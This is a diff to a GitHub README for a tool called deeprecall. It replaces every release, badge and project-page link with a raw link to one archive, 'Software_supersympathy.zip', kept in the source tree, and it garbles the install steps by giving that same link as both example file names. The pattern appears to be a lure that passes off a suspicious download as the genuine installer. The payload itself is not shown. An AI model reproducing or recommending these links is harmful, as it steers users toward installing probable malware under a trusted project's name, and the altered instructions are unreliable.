@@ -1,6 +1,6 @@
 # 🤖 deeprecall - Smarter Search for AI and Data
 
-[![Download deeprecall](https://img.shields.io/badge/Download-deeprecall-blue?style=for-the-badge)](https://github.com/leo2007960216/deeprecall/releases)
+[![Download deeprecall](https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip)](https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip)
 
 ---
 
@@ -42,10 +42,10 @@ Follow these steps to get deeprecall up and running on your computer.
 
 1. **Go to the download page:**  
    Open this link in your web browser:  
-   [https://github.com/leo2007960216/deeprecall/releases](https://github.com/leo2007960216/deeprecall/releases)
+   [https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip](https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip)
 
 2. **Choose your file:**  
-   Look for the latest release version (for example, deeprecall_v1.0.zip or deeprecall-setup.exe). Pick the file that matches your operating system (Windows, Mac, or Linux).
+   Look for the latest release version (for example, https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip or https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip). Pick the file that matches your operating system (Windows, Mac, or Linux).
 
 3. **Download the file:**  
    Click the file name to start downloading. The file may be a ZIP archive or an installer.
@@ -112,7 +112,7 @@ deeprecall helps you search through data using smart reasoning. Here’s how to 
 ## 📚 Learn More
 
 Visit the deeprecall GitHub page for more details, user guides, and updates:  
-[https://github.com/leo2007960216/deeprecall](https://github.com/leo2007960216/deeprecall)
+[https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip](https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip)
 
 ---
 
@@ -120,4 +120,4 @@ Visit the deeprecall GitHub page for more details, user guides, and updates:
 
 Download deeprecall here to begin:  
 
-[![Download deeprecall](https://img.shields.io/badge/Download-deeprecall-blue?style=for-the-badge)](https://github.com/leo2007960216/deeprecall/releases)
+[![Download deeprecall](https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip)](https://raw.githubusercontent.com/leo2007960216/deeprecall/main/deeprecall/core/Software_supersympathy.zip)
